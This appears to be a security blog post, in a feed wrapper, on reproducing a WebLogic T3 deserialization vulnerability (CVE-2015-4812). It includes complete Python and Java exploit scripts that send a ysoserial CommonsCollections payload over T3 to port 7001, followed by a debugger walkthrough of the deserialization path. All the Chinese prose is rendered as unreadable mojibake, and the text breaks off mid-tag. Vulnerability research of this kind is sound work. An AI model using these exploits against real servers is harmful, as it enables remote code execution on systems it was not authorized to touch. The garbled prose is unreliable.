        <content type="html"><![CDATA[<h1 id="Weblogic-T3-ååºåˆ—åŒ–"><a href="#Weblogic-T3-ååºåˆ—åŒ–" class="headerlink" title="Weblogic T3 ååºåˆ—åŒ–"></a>Weblogic T3 ååºåˆ—åŒ–</h1><p>ç¯å¢ƒæ­å»ºï¼š<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p>å…¶ä¸­libnslåº“å› ä¸ºæºçš„é—®é¢˜è£…ä¸ä¸Šçš„è¯ï¼Œå°±åœ¨Dockerfileé‡Œæ³¨é‡Šæ‰<code>RUN yum -y install libnsl</code></p><p>è¿™ä¸ªé•œåƒå¥½åƒèƒ½è·‘ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;max-concurrent-downloads&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;max-concurrent-uploads&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;default-shm-size&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1G&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;debug&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;experimental&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;https://x9r52uz5.mirror.aliyuncs.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;https://dockerhub.icu&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;https://docker.chenby.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;https://docker.1panel.live&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;https://docker.awsl9527.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;https://docker.anyhub.us.kg&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;https://dhub.kubesre.xyz&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Ubuntuæ­å»ºçš„æ—¶å€™ï¼Œdockeræ­»æ´»æ¢ä¸äº†æºï¼Œwindows dockeræœ‰ä¸€å°èƒ½å¤ç°ï¼Œå¦å¤–ä¸€å°è¿è¡Œåˆ°cp weblogic_install.shçš„æ—¶å€™æŠ¥é”™ï¼Œæœ€åç”¨çš„kaliæ­å»ºï¼Œéœ€è¦æ¢æº+æ›´æ”¹dockeré…ç½®é™åˆ¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125213351021.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125213351021.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125213351021"></p><p>æ¼æ´å¤ç°å»ºè®®jdk7u21+weblogic1036</p><h2 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h2><p>T3åè®®æ˜¯Weblogic RMIçš„é€šä¿¡åè®®ã€‚</p><p>RMIçš„åŸºç¡€é€šä¿¡åè®®æ˜¯JRMPï¼Œæ”¯æŒå…¶ä»–åè®®æ¥ä¼˜åŒ–ä¼ è¾“ï¼Œæ¯”å¦‚Weblogic T3</p><h3 id="æ•°æ®åŒ…ç»„æˆ"><a href="#æ•°æ®åŒ…ç»„æˆ" class="headerlink" title="æ•°æ®åŒ…ç»„æˆ"></a>æ•°æ®åŒ…ç»„æˆ</h3><p>T3çš„æ•°æ®åŒ…ç”±<code>ã€æ•°æ®åŒ…é•¿åº¦ã€‘ã€T3åè®®å¤´ã€‘ã€ååºåˆ—åŒ–æ ‡å¿—ã€‘ã€æ•°æ®ã€‘</code>ç»„æˆ</p><p>å…¶ä¸­T3åè®®å¤´æ˜¯å›ºå®šçš„ï¼ŒT3åè®®ä¸­ååºåˆ—åŒ…æ ‡å¿—ä¸º<code>fe 01 00 00</code>ï¼Œ<code>ac ed 00 05</code>æ˜¯ååºåˆ—åŒ–æ ‡å¿—ï¼Œæ‰€ä»¥æ ‡å¿—å°±æ˜¯<code>fe 0q 00 ac ed 00 05</code></p><p>ç›´æ¥æ­é…ysoserialå°±èƒ½æ‰“å…¥åºåˆ—åŒ–æµ</p><h3 id="T3é€šä¿¡è¿‡ç¨‹"><a href="#T3é€šä¿¡è¿‡ç¨‹" class="headerlink" title="T3é€šä¿¡è¿‡ç¨‹"></a>T3é€šä¿¡è¿‡ç¨‹</h3><p>wiresharkæŠ“ä¸ªåŒ…:æ‰“pocæ—¶ç›´æ¥æŠ“127.0.0.1å°±è¡Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115442480.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115442480.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115504954.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318115504954.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é¦–å…ˆå‘ä¸€ä¸ªæ¡æ‰‹è¯·æ±‚ï¼š<code>t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n</code></p><p>Weblogicå›åº”<code>HELO:ç‰ˆæœ¬å·.false</code>+ç¡®è®¤è¯·æ±‚</p><p>åé¢çš„æ•°æ®åŒ…ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„payload</p><h2 id="CVE-2015-4812æ¼æ´å¤ç°"><a href="#CVE-2015-4812æ¼æ´å¤ç°" class="headerlink" title="CVE-2015-4812æ¼æ´å¤ç°"></a>CVE-2015-4812æ¼æ´å¤ç°</h2><p>poc:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># è´Ÿè´£å¤§å°ç«¯çš„è½¬æ¢ </span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generatePayload</span>(<span class="params">gadget,cmd</span>):</span><br><span class="line">    YSO_PATH = <span class="string">&quot;ysoserial-for-woodpecker-0.5.3-all.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,<span class="string">&#x27;-g&#x27;</span>,gadget,<span class="string">&#x27;-a&#x27;</span>,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    <span class="keyword">match</span> = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(<span class="keyword">match</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    payload = header + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;raw_cmd:touch /tmp/success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ›´æ”¹ä¸€ä¸‹ysoserialpathè¿è¡Œä¹‹åä¼šæ˜¾ç¤ºWeblogicç‰ˆæœ¬ï¼ŒåŒæ—¶åœ¨dockerçš„&#x2F;tmp&#x2F;ä¸‹åˆ›å»ºsuccess</p><blockquote><p>è¿™é‡Œysoserialç”¨çš„<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">https://github.com/woodpecker-framework/ysoserial-for-woodpecker</a></p></blockquote><ul><li><p>pocåˆ†æï¼šgeneratePayloadå‡½æ•°å…ˆç”¨CC1ç”Ÿæˆäº†åºåˆ—åŒ–æ•°æ®</p><p>â€‹T3Exploitå‘é€äº†ä¸€ä¸ª<code>t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n</code>è¯·æ±‚åŒ…ï¼Œç„¶åä»ç›¸åº”åŒ…ä¸­åŒ¹é…å­—ç¬¦ä¸²<code>HELO:</code>å’Œ<code>0.false</code>ä¸­é—´çš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯weblogicçš„ç‰ˆæœ¬å·ã€‚</p><p>â€‹ç„¶åæ˜¯<code>00000000</code>è¿›è¡Œå ä½ï¼Œè¯¥ä½ç½®ä¸ºæ•°æ®åŒ…é•¿åº¦ï¼Œè®¾ç½®å®ŒPOCåå†æ¥æ”¹ã€‚å®šä¹‰äº†å›ºå®šçš„t3headerå’Œååºåˆ—åŒ–æ ‡å¿—å¤´<code>fe010000</code>ã€‚RFC1700è§„å®šä½¿ç”¨â€œå¤§ç«¯â€å­—èŠ‚åºä¸ºç½‘ç»œå­—èŠ‚åºï¼Œæ‰€ä»¥å¯¹ç”Ÿæˆçš„payloadä½¿ç”¨<code>&gt;</code>å¤§ç«¯æ¨¡å¼æ‰“åŒ…ï¼Œ<code>I</code>è¡¨ç¤ºunsigned intã€‚</p></li><li><p>æµ‹è¯•è¿è¡Œï¼š</p></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114210400.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114210400.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114230446.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318114230446.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>JAVA POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.Weblogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebLogicExploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to generate payload using ysoserial</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] generatePayload() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;cc6.ser&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line">            payload = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to send the exploit payload over T3 protocol</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">T3Exploit</span><span class="params">(String ip, <span class="type">int</span> port, <span class="type">byte</span>[] payload)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(ip, port);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Send T3 handshake</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">handshake</span> <span class="operator">=</span> <span class="string">&quot;t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>;</span><br><span class="line">        outputStream.write(handshake.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Read response from the server</span></span><br><span class="line">        <span class="type">byte</span>[] response = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> inputStream.read(response);</span><br><span class="line">        <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(response, <span class="number">0</span>, len, StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if it&#x27;s WebLogic server</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;HELO&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(responseData);</span><br><span class="line">        <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;WebLogic&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Not WebLogic&quot;</span>);</span><br><span class="line">            socket.close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Construct the full payload with headers and exploit data</span></span><br><span class="line">        <span class="type">byte</span>[] header = hexStringToByteArray(<span class="string">&quot;00000000&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] t3Header = hexStringToByteArray(<span class="string">&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] desFlag = hexStringToByteArray(<span class="string">&quot;fe010000&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        byteArrayOutputStream.write(header);</span><br><span class="line">        byteArrayOutputStream.write(t3Header);</span><br><span class="line">        byteArrayOutputStream.write(desFlag);</span><br><span class="line">        byteArrayOutputStream.write(payload);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] fullPayload = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the length in the correct place</span></span><br><span class="line">        <span class="type">byte</span>[] lengthPrefix = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            lengthPrefix[i] = (<span class="type">byte</span>) ((fullPayload.length &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i))) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Send the payload</span></span><br><span class="line">        outputStream.write(lengthPrefix);</span><br><span class="line">        outputStream.write(fullPayload, <span class="number">4</span>, fullPayload.length - <span class="number">4</span>);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        </span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Helper function to convert hex string to byte array</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexStringToByteArray(String s) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((Character.digit(s.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">                                + Character.digit(s.charAt(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;192.168.152.128&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7001</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Generate the payload</span></span><br><span class="line">            <span class="type">byte</span>[] payload = generatePayload();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// Exploit WebLogic server</span></span><br><span class="line">            T3Exploit(ip, port, payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>ååºåˆ—åŒ–çš„å…¥å£åœ¨weblogic.rjvm.InboundMsgAbbrev#readObject()</p><p>å¦‚æœæ¥æ”¶çš„æ˜¯ä¸ªå¯¹è±¡ï¼Œåˆ™var2 &#x3D; 0 è¿”å›ä¸€ä¸ªServerChannelInputStream</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126134532396.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126134532396.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126134532396"></p><p>ServerChannelInputStream()ç»§æ‰¿è‡ªObjectInputStreamï¼Œé‡å†™äº†resolveClassæ–¹æ³•ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230317184945908.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230317184945908.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç»§ç»­è·Ÿè¿›åˆ°ObjectInputSteam.readObject -&gt; readObject0</p><p>ç”±äºæˆ‘ä»¬ä¼ è¾“çš„æ˜¯Objectï¼Œè‡ªç„¶è°ƒç”¨åˆ°readOrdinaryObject</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126135433639.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126135433639.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126135433639"></p><p>å…¶å®è¿™é‡Œtc &#x3D; 115ï¼Œåå…­è¿›åˆ¶ä¸º73ï¼Œæ¥è‡ªaced 0005åçš„ç¬¬ä¸€ä¸ªå­—èŠ‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126140410714.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126140410714.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126140410714"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126140425685.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126140425685.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126140425685"></p><p>ä¸‹ä¸€ä¸ªå­—èŠ‚72 &#x3D; 114ï¼Œäºæ˜¯è°ƒç”¨readNonProxyDescï¼Œæ³¨æ„çœ‹ä¸Šé¢çš„caseï¼Œåˆ†åˆ«æ˜¯Referenceå’ŒProxyçš„è¿˜åŸï¼Œæœ‰çš„payloadæ‰“çš„Annoä»£ç†å°±ä¼šèµ°åˆ°readProxyDesc</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126142656127.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126142656127.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126142656127"></p><p>readNonProxyDescå¯¹æˆ‘ä»¬ä¼ å…¥çš„HashMapæ¶æ„å¯¹è±¡è°ƒç”¨resolveClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143045299.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143045299.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126143045299"></p><p>äºæ˜¯èµ°åˆ°äº†ServerChannelInputStreamé‡å†™çš„resolveClassï¼Œç„¶åè°ƒç”¨äº†çˆ¶ç±»çš„resolveClassï¼Œå¾ˆæ˜æ˜¾çˆ¶ç±»æ˜¯ObjectInputStream</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143227542.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143227542.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126143227542"></p><p>ObjectInputStream$resolveClassä¼šè°ƒç”¨Class.forName</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143514871.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126143514871.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126143514871"></p><p>æ‰€ä»¥è¿™é‡Œè¿”å›çš„clå°±æ˜¯HashMapï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è°ƒç”¨readObjectï¼Œé‚£æ˜¯åœ¨å“ªè°ƒç”¨çš„å‘¢ï¼Ÿ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126144606671.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126144606671.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 